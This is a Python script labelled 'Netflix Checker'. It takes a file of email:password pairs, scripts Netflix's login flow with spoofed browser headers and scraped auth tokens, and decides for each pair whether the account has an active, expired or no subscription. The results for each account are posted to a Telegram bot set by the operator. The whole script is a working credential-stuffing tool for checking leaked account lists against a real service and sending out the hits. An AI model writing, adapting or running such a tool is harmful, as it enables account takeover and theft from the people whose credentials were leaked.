import requests
import re
import time
from rich.console import Console
from rich.table import Table
from rich.prompt import Prompt
from rich.panel import Panel
#from bs4 import BeautifulSoup
def LeVi(token, chat_id, message):
    url = f"https://api.telegram.org/bot{token}/sendMessage"
    data = {
        "chat_id": chat_id,
        "text": message,
        "parse_mode": "Markdown"
    }
    requests.post(url, data=data)
def Fix(uE, pW):
    uRL = "https://www.netflix.com/"
    hDRs = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.5",
        "Accept-Encoding": "gzip, deflate, br",
        "Connection": "keep-alive"
    }
    try:
        response = requests.get(uRL, headers=hDRs, allow_redirects=False, timeout=30)
    except requests.exceptions.RequestException as e:
        return {"Error": str(e)}
    cookies = response.cookies    
    fLw = cookies.get('flwssn')
    nFv = cookies.get('nfvdid')
    secId = cookies.get('SecureNetflixId')
    netId = cookies.get('NetflixId')
    url2 = "https://www.netflix.com/bd/login"
    hDRs.update({
        "Host": "www.netflix.com",
        "Cookie": f"nfvdid={nFv}; SecureNetflixId={secId}; NetflixId={netId}; flwssn={fLw}",
        "Referer": "https://www.netflix.com/bd/"
    })
    try:
        response2 = requests.get(url2, headers=hDRs, timeout=30)
    except requests.exceptions.RequestException as e:
        return {"Error": str(e)}
    authMatch = re.search(r'"authURL":"(.*?)"', response2.text)
    esnMatch = re.search(r'"esn":"(.*?)"', response2.text)
    authURL = authMatch.group(1) if authMatch else None
    esn = esnMatch.group(1) if esnMatch else None
    authEnc = requests.utils.quote(authURL).replace("%3D", "=")
    H2 = {
        "origin": "https://www.netflix.com",
        "pragma": "no-cache",
        "referer": "https://www.netflix.com/eg/",
        "sec-ch-ua": "\"Not_A Brand\";v=\"99\", \"Google Chrome\";v=\"109\", \"Chromium\";v=\"109\"",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36 Edg/125.0.0.0",
        "x-netflix.browsername": "Chrome",
        "x-netflix.browserversion": "109",
        "x-netflix.client.request.name": "ui/xhrUnclassified",
        "x-netflix.clienttype": "akira",
        "x-netflix.request.routing": "{\"path\":\"/nq/aui/endpoint/%5E1.0.0-web/pathEvaluator\",\"control_tag\":\"auinqweb\"}",
        "x-netflix.uiversion": "v758ce024"
    }
    D2 = {
        "authURL": authEnc,
        "tracingId": "v758ce024",
        "tracingGroupId": "www.netflix.com",
        "esn": esn,
        "param": '{"flow":"signupSimplicity","mode":"welcome","action":"saveAction","fields":{"email":{"value":"' + uE + '"}}}'
    }
    try:
        response1 = requests.post(
            "https://www.netflix.com/api/aui/pathEvaluator/web/%5E2.0.0?landingURL=%2Feg%2F&landingOrigin=https%3A%2F%2Fwww.netflix.com&inapp=false&languages=ar-EG&netflixClientPlatform=browser&supportCategory=innovation&method=call&callPath=%5B%22aui%22%2C%22moneyball%22%2C%22next%22%5D&falcor",
            headers=H2,
            data=D2
        )
    except requests.exceptions.RequestException as e:
        return {"Error": str(e)}
    src1 = response1.text
    #response = requests.get("https://www.google.com/recaptcha/enterprise/anchor", params= {
#    "ar": "1",
#    "k": "6Lf8hrcUAAAAAIpQAFW2VFjtiYnThOjZOA5xvLyR",
#    "co": "aHR0cHM6Ly93d3cubmV0ZmxpeC5jb206NDQz",
#    "hl": "en",
#    "v": "9pvHvq7kSOTqqZusUzJ6ewaF",
#    "size": "invisible",
#    "cb": "z1djqpwiv6vt"
#})
    H3 = {    
        "referer": "https://www.netflix.com/signup/password?locale=ar-IQ",
        "sec-ch-ua": "\"Not_A Brand\";v=\"99\", \"Google Chrome\";v=\"109\", \"Chromium\";v=\"109\"",     
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36 Edg/125.0.0.0",
        "x-netflix.request.routing": "{\"path\":\"/nq/aui/endpoint/%5E1.0.0-web/pathEvaluator\",\"control_tag\":\"auinqweb\"}",
        "x-netflix.uiversion": "v758ce024"
    }
    D3 = {
        "allocations": '{"53701":5,"53818":2}',
        "tracingId": "v758ce024",
        "tracingGroupId": "www.netflix.com",
        "esn": esn,
        "authURL": authEnc,
        "param": '{"flow":"signupSimplicity","mode":"passwordOnly","action":"loginAction","fields":{"password":{"value":"' + pW + '"},"email":{"value":"' + uE + '"},"previousMode":""}}'
    }

    try:
        response2 = requests.post(
            "https://www.netflix.com/api/aui/pathEvaluator/web/%5E2.0.0?landingURL=%2Fsignup%2Fpassword&landingOrigin=https%3A%2F%2Fwww.netflix.com&inapp=false&isConsumptionOnly=false&logConsumptionOnly=false&languages=ar-EG&netflixClientPlatform=browser&supportCategory=innovation&method=call&callPath=%5B%22aui%22%2C%22moneyball%22%2C%22next%22%5D&falcor_server=0.1.0",
            headers=H3,
            data=D3
        )
    except requests.exceptions.RequestException as e:
        return {"Error": str(e)}
    src2 = response2.text
    if "CURRENT_MEMBER" in src2:
        return {"Has Subscription On Netflix": True}
    elif "NEVER_MEMBER" in src2 or "NON_REGISTERED_MEMBER" in src2:
        return {"Has Subscription On Netflix": False}
    elif "FORMER_MEMBER" in src2 or "Your membership is paused." in src2:
        return {"Has Subscription On Netflix": "Expired"}
    else:
        return {"Has Subscription On Netflix": "Unknown"}
def Fox():
    c = Console()
    t = Table(title="Netflix Checker")
    t.add_column("Step", style="cyan", no_wrap=True)
    t.add_column("Description", style="magenta")
    c.print(Panel("Please enter the following details", title="Netflix Checker", border_style="green"))
    token = Prompt.ask("[bold cyan]Enter Telegram Bot Token[/]")
    chat_id = Prompt.ask("[bold cyan]Enter Telegram Chat ID[/]")
    file_name = Prompt.ask("[bold cyan]Enter File Name containing accounts[/]")
    with open(file_name, "r") as f:
        accounts = f.readlines()
    results = []
    for account in accounts:
        uE, pW = account.strip().split(':')
        result = Fix(uE, pW)
        results.append(result)
        LeVi(token, chat_id, f"Account: {uE}\nResult: {result}")
    t.add_row("1", "Fetched accounts from file")
    t.add_row("2", "Checked Netflix subscription status for each account")
    t.add_row("3", "Sent results to Telegram bot")
    c.print(t)
if __name__ == "__main__":
    Fox()
